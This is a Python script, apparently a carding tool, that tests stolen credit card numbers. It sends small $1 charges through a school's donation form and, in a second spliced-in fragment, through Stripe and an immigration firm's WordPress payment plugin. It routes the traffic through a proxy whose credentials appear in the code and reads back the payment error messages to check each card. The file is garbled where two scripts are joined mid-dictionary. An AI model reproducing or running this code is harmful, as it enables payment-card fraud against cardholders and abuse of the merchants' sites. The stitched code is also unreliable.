import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		type = "Visa"
	if n.startswith("5"):
		type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	cookies = {
	    'PHPSESSID': '4142f3c37c6efb05b389d2861d',
	}
	
	headers = {
	    'authority': 'www.oakwoodfriends.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = session.get(
	    'https://www.oakwoodfriends.org/forms/lighting-the-way-campaign-donation-to-oakwood-friends-school/',
	    cookies=cookies,
	    headers=headers,
	)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	csrf = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '4142f3c37c6efb05b389d2861d',
	    '_gid': 'GA1.2.317092951.1754024640',
	    '_ga_EQG0DHYGHS': 'GS2.1.s1754022338$o1$g1$t1754024639$j39$l0$h0',
	    '_ga': 'GA1.1.746156273.1754024640',
	}
	
	headers = {
	    'authority': 'www.oakwoodfriends.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.oakwoodfriends.org',
	    'referer': 'https://www.oakwoodfriends.org/forms/lighting-the-way-campaign-donation-to-oakwood-friends-school/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'formProcessed': 'Donate_Lighting-the-Way',
	}
	
	data = {
	    'formField_donation_select': 'other',
	    'formField_other_amount': '1',
	    'formField_bill_firstname': 'Rodam',
	    'formField_bill_lastname': 'User',
	    'formField_bill_address1': 'Street 27',
	    'formField_bill_city': 'New York',
	    'formField_bill_state': 'NY',
	    'formField_bill_zip': '10014',
	    'formField_Name': 'Rodam User',
	    'formField_Affiliation': 'Other',
	    'formField_class_year': '1',
	    'formField_Phone': '4303000850',
	    'formField_Email': 'genpaypal01@gmail.com',
	    'formField_Comments': '',
	    'formPayment_method': 'Credit Card',
	    'formPayment_card': f'{type}',
	    'formPayment_owner': 'Rodam User',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': f'{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formPayment_gateway': '',
	    'formPayment_total_payment': '1',
	    'formField_TotalDonationAmount': '',
	    'hash': f'{hash}',
	    'csrfToken': f'{csrf}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'Donate_Lighting-the-Way',
	    'fs_id': 'Donate_Lighting-the-Way',
	}
	
	response = session.post('https://www.oakwoodfriends.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'Payment error:</b> (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'&nbsp;e-mail (.*?) to <a', response.text).group(1)
		
	return (result)	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'JTdCJTIybXVpZCUyMiUzQSUyMmVlOTUyNTI4LTgxOGMtNDQwZi1iZGI5LTRjNmViMGJjMGE0YzU2NTcwNiUyMiUyQyUyMnNpZCUyMiUzQSUyMmVhNDBjYzc1LWI1MDEtNDA1Ni1hZmY3LTU0MDg4ZDFjMTFkZTA4Mzg0ZiUyMiUyQyUyMnVybCUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGeHpSLTFFS0FWMlV4eE9CRWY4T000bDRsNF9ReER6Mi1hc2RWNGdTQzVVZy5Edk50aWkyTWZubWlTVHN5YTVCY3RUMDh2OHFnbGxFOVhlUVkyckRMZjc0JTJGc1hfWjhrTVlsX3V0dzF1ZUxRVGl6U1ppY2Z3UGctbVNsNUJxc09ua0tWUSUyRiUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMm1vdXNlLXRpbWluZ3MtMTAtdjIlMjIlMkMlMjJkYXRhJTIyJTNBJTVCJTVEJTdE'
	
	response = requests.post('https://m.stripe.com/6', cookies=cookies, headers=headers, data=data)
	
	muid = re.search(r'"muid":"(.*?)"', response.text).group(1)
	sid = re.search(r'"sid":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Faa85643f31%3B+stripe-js-v3%2Faa85643f31%3B+card-element&referrer=https%3A%2F%2Foneworldimmigration.ca&time_on_page=22459&client_attribution_metadata[client_session_id]=f5f29992-b152-490d-883b-0785eb113f6e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_F5m5jROJdMKhMezaOOpJBPPN00ybSsneIp'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__stripe_mid': f'{muid}',
	    '__stripe_sid': f'{sid}',
	}
	
	headers = {
	    'authority': 'oneworldimmigration.ca',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=67edb23b-e8ff-44db-891c-4ec11a0dced282829b; __stripe_sid=761f9ac5-3f48-4177-a36d-60383c630bd384b68f',
	    'origin': 'https://oneworldimmigration.ca',
	    'referer': 'https://oneworldimmigration.ca/square-payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_payment_charge',
	    'wpfs-form-name': 'E_SecurePayment_CAD',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-custom-input[]': [
	        '',
	        '',
	        '',
	        '',
	        '',
	        '',
	        '',
	        '',
	    ],
	    'wpfs-card-holder-email': 'rodamuser08@gmail.com',
	    'wpfs-card-holder-name': 'Rodam User',
	    'wpfs-stripe-payment-method-id': pm,
	}
	
	response = session.post('https://oneworldimmigration.ca/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
		
	return (result)
